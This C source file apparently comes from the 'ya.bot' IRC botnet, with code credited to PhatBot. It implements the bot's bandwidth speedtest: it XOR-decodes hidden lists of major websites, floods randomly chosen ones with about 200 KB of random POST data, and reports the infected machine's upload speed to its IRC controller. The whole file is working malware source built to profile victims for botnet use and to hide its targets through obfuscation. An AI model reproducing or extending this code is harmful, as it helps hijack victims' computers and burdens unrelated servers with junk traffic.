/*  ya.bot  */

#include "bot.h"

#ifndef NO_SPEEDTEST

void speedtest_http(SOCKET bsock,
		char *pszAction,
		char *pszDestination,
		bool bSilent,
		bool bVerbose)
{
	char *rgpszEUList[] =
	{
			"\xBE\xBE\xBE\xE7\xF8\xBC\xA7\xAD\xF8\xE7\xAD\xAC", //www.1und1.de
			"\xBE\xBE\xBE\xE7\xA6\xB1\xE7\xA8\xAA\xE7\xBC\xA2", //www.ox.ac.uk
			"\xBE\xBE\xBE\xE7\xBA\xBC\xA7\xAC\xBD\xE7\xBA\xAC", //www.sunet.se
			"\xBE\xBE\xBE\xE7\xBA\xBE\xA0\xBD\xAA\xA1\xE7\xAA\xA1", //www.switch.ch
			"\xBE\xBE\xBE\xE7\xBF\xAC\xBB\xA0\xA6\xE7\xAF\xBB", //www.verio.fr
			"\xBE\xBE\xBE\xE7\xB1\xBA\xFD\xA8\xA5\xA5\xE7\xA7\xA5", //www.xs4all.nl
	};
	char *rgpszJPList[] = //The only developed country in asia ;)
	{
			"\xBE\xBE\xBE\xE7\xA8\xA4\xA8\xB3\xA6\xA7\xE7\xAA\xA6\xE7\xA3\xB9", //www.amazon.co.jp
			"\xBE\xBE\xBE\xE7\xAF\xA8\xA4\xA0\xBD\xBA\xBC\xE7\xAA\xA6\xA4", //www.famitsu.com
			"\xBE\xBE\xBE\xE7\xAE\xA6\xA6\xAE\xA5\xAC\xE7\xAA\xA6\xE7\xA3\xB9", //www.google.co.jp
			"\xBE\xBE\xBE\xE7\xA0\xA7\xAF\xA6\xBA\xAC\xAC\xA2\xE7\xAA\xA6\xE7\xA3\xB9", //www.infoseek.co.jp
			"\xBE\xBE\xBE\xE7\xA2\xAC\xA0\xA6\xE7\xA8\xAA\xE7\xA3\xB9", //www.keio.ac.jp
			"\xBE\xBE\xBE\xE7\xB0\xA8\xA1\xA6\xA6\xE7\xAA\xA6\xE7\xA3\xB9", //www.yahoo.co.jp
	};
	char *rgpszUSList[] =
	{
			"\xBE\xBE\xBE\xE7\xAA\xA7\xA7\xE7\xAA\xA6\xA4", //www.cnn.com
			"\xBE\xBE\xBE\xE7\xAC\xAB\xA8\xB0\xE7\xAA\xA6\xA4", //www.ebay.com
			"\xBE\xBE\xBE\xE7\xAE\xA6\xA6\xAE\xA5\xAC\xE7\xAA\xA6\xA4", //www.google.com
			"\xBE\xBE\xBE\xE7\xA4\xA0\xBD\xE7\xAC\xAD\xBC", //www.mit.edu
			"\xBE\xBE\xBE\xE7\xBA\xBD\xA8\xA7\xAF\xA6\xBB\xAD\xE7\xAC\xAD\xBC", //www.stanford.edu
			"\xBE\xBE\xBE\xE7\xB0\xA8\xA1\xA6\xA6\xE7\xAA\xA6\xA4", //www.yahoo.com
	};
	DWORD dwEUSpeed, dwJPSpeed, dwSpeed1, dwSpeed2, dwTotalSpeed = 0, dwUSSpeed;
	int i;

#ifndef NO_DEBUG
		debug_print("Doing HTTP speedtest, speedtest_http()");
#endif

	if ((!bSilent) && (bVerbose))
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_speedtestgettinghttpspeed,
					CBLUE, string_replyspeedtest, CEND, string_replydotbot);
		srand(GetTickCount());
//EU...
	for (i = 0; i < ARRAYSIZE(rgpszEUList); i++)
			crypto_xor(rgpszEUList[i], xorkey);
		dwSpeed1 = speedtest_httpgetspeed(rgpszEUList[rand() % ARRAYSIZE(rgpszEUList)]);
		dwSpeed2 = speedtest_httpgetspeed(rgpszEUList[rand() % ARRAYSIZE(rgpszEUList)]);
	for (i = 0; i < ARRAYSIZE(rgpszEUList); i++)
			crypto_xor(rgpszEUList[i], xorkey);
		dwEUSpeed = (dwSpeed1 + dwSpeed2) / 2;
//JP...
	for (i = 0; i < ARRAYSIZE(rgpszJPList); i++)
			crypto_xor(rgpszJPList[i], xorkey);
		dwSpeed1 = speedtest_httpgetspeed(rgpszJPList[rand() % ARRAYSIZE(rgpszJPList)]);
		dwSpeed2 = speedtest_httpgetspeed(rgpszJPList[rand() % ARRAYSIZE(rgpszJPList)]);
	for (i = 0; i < ARRAYSIZE(rgpszJPList); i++)
			crypto_xor(rgpszJPList[i], xorkey);
		dwJPSpeed = (dwSpeed1 + dwSpeed2) / 2;
//US...
	for (i = 0; i < ARRAYSIZE(rgpszUSList); i++)
			crypto_xor(rgpszUSList[i], xorkey);
		dwSpeed1 = speedtest_httpgetspeed(rgpszUSList[rand() % ARRAYSIZE(rgpszUSList)]);
		dwSpeed2 = speedtest_httpgetspeed(rgpszUSList[rand() % ARRAYSIZE(rgpszUSList)]);
	for (i = 0; i < ARRAYSIZE(rgpszUSList); i++)
			crypto_xor(rgpszUSList[i], xorkey);
		dwUSSpeed = (dwSpeed1 + dwSpeed2) / 2;
//Total...
		dwTotalSpeed = (dwEUSpeed + dwJPSpeed + dwUSSpeed) / 3;
	if (!bSilent)
			irc_message(bsock, pszAction, pszDestination,
					(char *)string_speedtesthttpspeedtest,
					CGREEN, string_replyspeedtest, CEND, string_replydotbot,
					CBLUE, CEND, dwEUSpeed,
					CBLUE, CEND, dwJPSpeed,
					CBLUE, CEND, dwUSSpeed,
					CBLUE, CEND, dwTotalSpeed);
		return;
}

//botbotbotbotbotbotbotbotbotbotbotbotbot
//Original code from PhatBot
//botbotbotbotbotbotbotbotbotbotbotbotbot

DWORD speedtest_httpgetspeed(char *pszHost) 
{
	char szBuffer[(1024 * 200) + 3], szRequest[(1024 * 200) + 1002];
	DWORD dwLength, dwTickEnd, dwTickStart, i;
	sockaddr_in sin;
	SOCKET sock;

#ifndef NO_DEBUG
		debug_print("Getting http speed, speedtest_httpgetspeed()");
#endif

	if (!gethostbyname(pszHost))
			return 0;
		sin.sin_addr.s_addr = *(LPDWORD)gethostbyname((char *)pszHost)->h_addr_list[0];
		sin.sin_family = AF_INET;
		sin.sin_port = htons(80);
		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET)
			return 0;
	if (connect(sock, (sockaddr *)&sin, sizeof(sin)) == SOCKET_ERROR)
			return 0;
		srand(GetTickCount());
		memset(szBuffer, 0, sizeof(szBuffer) - 2);
		memset(szBuffer, (char)rand() % 255, sizeof(szBuffer) - 3);
		dwLength = strlen(szBuffer);
		_snprintf(szRequest, sizeof(szRequest) - 1,
				string_speedtesthttprequest,
				"\r\n",
				pszHost, "\r\n",
				dwLength, "\r\n\r\n",
				szBuffer, "\r\n");
		dwLength = strlen(szRequest);
		dwTickStart = GetTickCount();
	for (i = 0; i < dwLength; i += 1024) 
	{
		if ((dwLength - i) < 1024) 
		{
			if (send(sock, szRequest + i, dwLength - i, 0) == SOCKET_ERROR) 
			{ 
					closesocket(sock);
					return 0; 
			}
		} 
		else 
		{
			if (send(sock, szRequest + i, 1024, 0) == SOCKET_ERROR) 
			{ 
					closesocket(sock);
					return 0; 
			}
		}
	}
		dwTickEnd = GetTickCount();
		closesocket(sock);
		return ((dwLength / ((dwTickEnd - dwTickStart) / 1000)) / 1024);
}
#endif